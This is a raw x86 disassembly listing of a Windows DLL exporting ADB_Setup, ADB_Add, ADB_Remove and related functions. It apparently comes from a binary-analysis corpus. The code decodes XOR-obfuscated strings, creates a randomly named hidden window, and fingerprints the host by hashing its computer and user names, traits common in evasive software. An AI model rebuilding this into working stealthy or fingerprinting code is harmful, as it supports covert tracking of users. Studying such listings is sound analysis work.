sub eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
jb r-xdata
push 0xffffffff
push 0x0
push edx
push ecx
call sub_10032930
push eax
mov ecx esi
call sub_10004f60
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10037ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052f8c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
add esi 0x28
mov [ ebp + 0x8 ] esi
add edi 0x28
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
lea ecx [ esi + 0x10 ]
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp edi ebx
je r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov [ eax ] 0x0
push 0xffffffff
push 0x0
lea eax [ edi + 0x10 ]
push eax
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
sub_10037b97
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
push esi
call sub_100365b0
add esi 0x28
cmp esi edi
jne r-xdata
sub_10037bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
call sub_1003cdeb
push [ esi + 0x4 ]
mov [ esi + 0xc ] eax
push 0x0
push eax
call sub_10045ec0
add esp 0x10
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10037c50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
push [ esi + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10037ce0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] 0x0
je r-xdata
mov ecx [ edi + 0x4 ]
cmp esi ecx
jb r-xdata
lea eax [ esi + ebx ]
mov [ ebp + 0x10 ] eax
cmp eax [ edi + 0x4 ]
jbe r-xdata
lea eax [ esi + ebx ]
cmp eax ecx
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0xc
push eax
call sub_1003cdeb
push [ edi + 0x4 ]
mov esi eax
push [ edi + 0xc ]
push esi
call sub_1003dc80
push [ edi + 0xc ]
call j_sub_1003f3e3#2
mov eax [ ebp + 0x10 ]
add esp 0x14
mov [ edi + 0xc ] esi
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
mov eax [ edi + 0xc ]
push ebx
push [ ebp + 0xc ]
add eax esi
push eax
call sub_1003dc80
lea eax [ esi + ebx ]
add esp 0xc
cmp [ edi + 0x8 ] eax
jae r-xdata
mov ebx ecx
sub ebx esi
mov [ edi + 0x10 ] 0x0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov [ edi + 0x8 ] eax
sub_10037d80
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x8 ]
cmp edx edi
jb r-xdata
push esi
mov esi [ ebp + 0x10 ]
lea eax [ edx + esi ]
cmp eax edi
jbe r-xdata
xor eax eax
pop edi
pop ebp
retn 0xc
mov ecx [ ecx + 0xc ]
push esi
add ecx edx
push ecx
push [ ebp + 0xc ]
call sub_1003dc80
add esp 0xc
mov eax esi
pop esi
pop edi
pop ebp
retn 0xc
mov esi edi
sub esi edx
sub_10037dc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052fb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
or ecx 0xffffffff
mov edx [ edi + 0x8 ]
mov esi [ edi + 0xc ]
test edx edx
je r-xdata
not ecx
mov [ ebp - 0x10 ] ecx
mov [ edi + 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov [ ebp - 0x14 ] r--data
lea ebx [ ebx ]
movzx eax [ esi ]
lea esi [ esi + 0x1 ]
xor eax ecx
shr ecx 0x8
and eax 0xff
xor ecx [ eax * 4 + r--data ]
dec edx
jne r-xdata
sub_10037e80
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x11
jne r-xdata
cmp eax 0x16
jne r-xdata
mov eax 0x1
pop ebp
retn 0x10
mov [ ebp + 0xc ] eax
pop ebp
jmp [ DefWindowProcW@IAT ]
push 0x0
push 0x0
push 0x2
push [ ebp + 0x8 ]
call [ PostMessageW@IAT ]
xor eax eax
pop ebp
retn 0x10
sub_10037ec0
push ebp
mov ebp esp
and esp 0xfffffff0
push 0xffffffff
push sub_10052fe8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] r--data
call [ GetTickCount@IAT ]
mov esi eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x60 ] 0x0
xor edi edi
lea ecx [ edi + 0x1a ]
jmp r-xdata
imul esi esi 0x343fd
xor edx edx
add esi 0x269ec3
mov eax esi
mov [ esp + 0x20 ] esi
shr eax 0x10
div ecx
mov eax [ esp + 0x14 ]
add edx 0x61
mov [ eax + edi * 2 ] dx
inc edi
cmp edi 0x46
jb r-xdata
mov ecx [ esp + 0x18 ]
xorps xmm0 xmm0
movq [ esp + 0x44 ] xmm0
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x24 ]
movdqa [ esp + 0x24 ] xmm0
movdqa [ esp + 0x34 ] xmm0
push eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x2c ] sub_10037e80
mov [ esp + 0x34 ] 0x1e
call [ RegisterClassW@IAT ]
movzx eax ax
test ax ax
jne r-xdata
mov eax 0x1
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
mov [ esp + 0x60 ] 0xffffffff
mov [ esp + 0x1c ] r--data
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10037fc0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push 0x208
lea eax [ ebp - 0x20c ]
mov ebx ecx
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea edx [ ebp - 0x20c ]
mov ecx ebx
call sub_10037ec0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
push esi
push 0x0
push ebx
push 0x0
push 0x0
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x0
push r--data
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
push edi
mov edi [ GetMessageW@IAT ]
lea eax [ ebp - 0x228 ]
push 0x0
push 0x0
push esi
push eax
call edi
test eax eax
je r-xdata
push esi
call [ DestroyWindow@IAT ]
push ebx
lea eax [ ebp - 0x20c ]
push eax
call [ UnregisterClassW@IAT ]
pop edi
mov eax [ ebp - 0x224 ]
cmp eax 0x2
je r-xdata
cmp eax 0x12
je r-xdata
lea eax [ ebp - 0x228 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x228 ]
push eax
call [ DispatchMessageW@IAT ]
push 0x0
push 0x0
push esi
lea eax [ ebp - 0x228 ]
push eax
call edi
test eax eax
jne r-xdata
ADB_Cleanup
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x50
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push [ ebp + 0x8 ]
mov ecx eax
call sub_10038640
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
ADB_Setup
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x10 ]
push ADB_Load
push 0x0
push 0x0
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp + 0xc ]
call sub_10037fc0
pop ebp
retn 0x10
ADB_Add
push ebp
mov ebp esp
push 0xffffffff
push sub_10053023
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x78
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
sub esp 0x18
mov edx esp
mov [ ebp - 0x14 ] esp
mov [ edx + 0x14 ] 0xf
mov [ edx + 0x10 ] 0x0
mov [ edx ] 0x0
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea ebx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx ebx
push ecx
push edi
mov ecx edx
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1001ae10
mov ecx eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
ADB_Remove
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10053048
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
lea ecx [ esp + 0x4 ]
call sub_1003b030
mov [ esp + 0x70 ] 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_1003b140
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x10
sub_100382c0
push ebx
mov ebx esp
sub esp 0x8
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edi
mov edx [ edi * 4 + r--data ]
mov al [ edx ]
movzx esi [ edx + 0x1 ]
mov [ ebp - 0x1 ] al
movsx eax al
movd xmm0 eax
lea eax [ esi + 0x1 ]
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
push eax
movdqa [ ebp - 0x20 ] xmm0
call sub_1003cdeb
mov edx eax
add esp 0x4
xor ecx ecx
mov [ esi + edx ] 0x0
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
cmp esi 0x10
jb r-xdata
cmp ecx esi
jae r-xdata
mov eax [ edi * 4 + r--data ]
lea edi [ eax + 0x3 ]
add eax 0x2
add eax esi
mov [ ebp - 0xc ] edi
cmp edx eax
ja r-xdata
mov eax edx
mov eax [ edi * 4 + r--data ]
lea edi [ eax + 0x3 ]
mov ah [ ebp - 0x1 ]
lea esp [ esp ]
movdqa xmm1 [ ebp - 0x20 ]
mov eax esi
and eax 0xf
mov edi esi
sub edi eax
mov eax [ ebp - 0xc ]
jmp r-xdata
lea eax [ esi - 0x1 ]
add eax edx
cmp eax edi
jae r-xdata
mov al [ edi + ecx ]
xor al ah
mov [ ecx + edx ] al
inc ecx
cmp ecx esi
jb r-xdata
movdqu xmm0 [ eax + ecx ]
pxor xmm0 xmm1
movdqu [ ecx + edx ] xmm0
add ecx 0x10
cmp ecx edi
jb r-xdata
mov edi [ ebp - 0x8 ]
sub_100383b0
push ebp
mov ebp esp
push ecx
mov eax ecx
mov edx 0x2
mov [ ebp - 0x4 ] eax
xor ecx ecx
push ebx
push esi
mov eax [ eax * 4 + r--data ]
push edi
movzx edi [ eax + 0x1 ]
mov bl [ eax ]
lea eax [ edi + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003cdeb
mov esi eax
add esp 0x4
xor eax eax
xor ecx ecx
mov [ esi + edi * 2 ] ax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov edx [ edx * 4 + r--data ]
lea ecx [ ecx ]
mov al [ edx + ecx + 0x3 ]
xor al bl
movzx eax al
mov [ esi + ecx * 2 ] ax
inc ecx
cmp ecx edi
jb r-xdata
sub_10038450
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10053083
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x58
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x70 ] 0x0
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_1003b030
mov esi eax
jmp r-xdata
mov [ esp + 0x70 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_10038760
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ Sleep@IAT ]
mov [ esp + 0x70 ] 0xffffffff
mov edx edi
mov ecx esi
call sub_1002f8a0
push esi
lea ecx [ esp + 0x18 ]
call sub_10038640
mov [ esp + 0x70 ] 0x1
cmp [ esp + 0x3c ] 0x0
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_10038a90
push 0x1
call esi
cmp [ esp + 0x3c ] 0x0
je r-xdata
sub_10038510
push ebp
mov ebp esp
push 0xffffffff
push sub_100530c1
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
lea esi [ ecx + 0x4 ]
mov edi [ ebp + 0x8 ]
mov ecx edi
push 0xffffffff
push 0x0
push esi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x18 ]
mov [ edi + 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10038590
push ebp
mov ebp esp
push 0xffffffff
push sub_100530f9
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ecx + 0x38 ]
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
push eax
call sub_1002fb60
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_100385f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10038640
push ebp
mov ebp esp
push 0xffffffff
push sub_10053149
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov [ esi + 0x1c ] r--data
call [ GetTickCount@IAT ]
mov [ esi + 0x20 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x40 ] r--data
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x4c ] 0x0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
call sub_1003ba00
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax + 0x8 ]
mov [ esi + 0x48 ] ecx
mov eax [ eax + 0xc ]
mov [ esi + 0x4c ] eax
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ebp - 0x24 ] r--data
mov [ esi + 0xc ] 0x0
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x24 ] ax
mov [ esi + 0x28 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10038730
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10038760
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10038760
push ebp
mov ebp esp
push 0xffffffff
push sub_10053191
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x8 ] 0x0
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x1c ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
sub_10038830
push ebp
mov ebp esp
push 0xffffffff
push sub_100531c6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf04
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + 0x4c ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
xor ebx ebx
mov [ ebp - 0xf08 ] r--data
mov [ ebp - 0xf04 ] ebx
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0xef0 ]
push 0xede
push ebx
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0xef4 ] 0xede
lea eax [ ebp - 0xef4 ]
push eax
lea eax [ ebp - 0xef0 ]
push eax
call [ GetComputerNameW@IAT ]
test eax eax
je r-xdata
push 0xede
lea eax [ ebp - 0xef0 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0xef4 ] 0xede
lea eax [ ebp - 0xef4 ]
push eax
lea eax [ ebp - 0xef0 ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xef4 ]
lea edx [ ebp - 0xef0 ]
or ebx 0xffffffff
lea ecx [ eax + eax ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0xf00 ]
call sub_1002d010
mov [ ebp - 0x4 ] 0x1
mov eax 0x4ec4ec4f
mov esi [ ebp - 0xefc ]
mov ecx [ ebp - 0xf00 ]
sub esi ecx
imul esi
mov [ ebp - 0xf0c ] 0x0
push [ ebp - 0xf0c ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov edx [ ebp - 0xefc ]
push eax
call sub_100396b0
mov esi [ ebp - 0xf00 ]
add esp 0x8
mov edi [ ebp - 0xefc ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0xef4 ]
lea edx [ ebp - 0xef0 ]
not ebx
lea ecx [ eax + eax ]
test ecx ecx
je r-xdata
not ebx
mov [ ebp - 0xf04 ] ebx
mov edi edi
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0xf00 ]
test esi esi
je r-xdata
add esi 0x34
nop
not ebx
mov [ ebp - 0xf04 ] ebx
nop
movzx eax [ edx ]
lea edx [ edx + 0x1 ]
xor eax ebx
shr ebx 0x8
and eax 0xff
xor ebx [ eax * 4 + r--data ]
dec ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax ebx
mov [ ebp - 0xf08 ] r--data
mov edi [ ebp - 0xefc ]
cmp esi edi
je r-xdata
add esi 0x68
lea eax [ esi - 0x34 ]
cmp eax edi
jne r-xdata
cmp [ esi + 0x18 ] 0x10
mov edx [ esi + 0x14 ]
jb r-xdata
movzx eax [ edx ]
lea edx [ edx + 0x1 ]
xor eax ebx
shr ebx 0x8
and eax 0xff
xor ebx [ eax * 4 + r--data ]
dec ecx
jne r-xdata
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0xf00 ] 0x0
mov [ ebp - 0xefc ] 0x0
mov [ ebp - 0xef8 ] 0x0
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi edi
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov esi [ ebp - 0xf00 ]
not ebx
mov [ ebp - 0xf04 ] ebx
lea esp [ esp ]
not ebx
test edx edx
je r-xdata
movzx ecx [ eax ]
lea eax [ eax + 0x1 ]
xor ecx ebx
shr ebx 0x8
and ecx 0xff
xor ebx [ ecx * 4 + r--data ]
dec edx
jne r-xdata
sub_10038a90
push ebp
mov ebp esp
push 0xffffffff
push sub_100532d3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x74 ] ebx
xor eax eax
mov [ ebp - 0x58 ] eax
mov ecx [ ebx + 0x18 ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x18 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x8 ]
mov edi [ ebx + 0xc ]
mov eax [ ecx + 0x24 ]
sub eax [ ecx + 0x20 ]
sar eax 0x2
cmp edi eax
jb r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
xor ecx ecx
cmp ecx eax
mov ecx [ ebx + 0x18 ]
sbb esi esi
neg esi
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx ebx
call sub_10039220
mov eax [ ecx + 0x20 ]
mov edi [ eax + edi * 4 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0x4 ]
mov esi eax
mov ecx esi
mov [ ebp - 0x54 ] esi
mov edx [ esi ]
call [ edx + 0x4 ]
test eax eax
jne r-xdata
mov [ ebx + 0x28 ] 0x1
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebx + 0x18 ] 0x0
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x24
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov edx [ esi ]
mov ecx esi
push 0x1
call [ edx ]
inc [ ebx + 0xc ]
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebx + 0x14 ] 0x0
xor esi esi
mov [ ebp - 0x4c ] esi
mov ecx ebx
call sub_10038830
push eax
mov ecx esi
call sub_10034800
mov esi eax
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov ecx [ ebx + 0x8 ]
inc [ ebx + 0xc ]
mov [ ebx + 0x2c ] 0x0
mov eax [ ecx + 0x24 ]
sub eax [ ecx + 0x20 ]
sar eax 0x2
cmp [ ebx + 0xc ] eax
jb r-xdata
mov eax [ ebx + 0x8 ]
inc [ ebx + 0x2c ]
mov ecx [ ebx + 0x2c ]
cmp ecx [ eax + 0x30 ]
jb r-xdata
xor esi esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
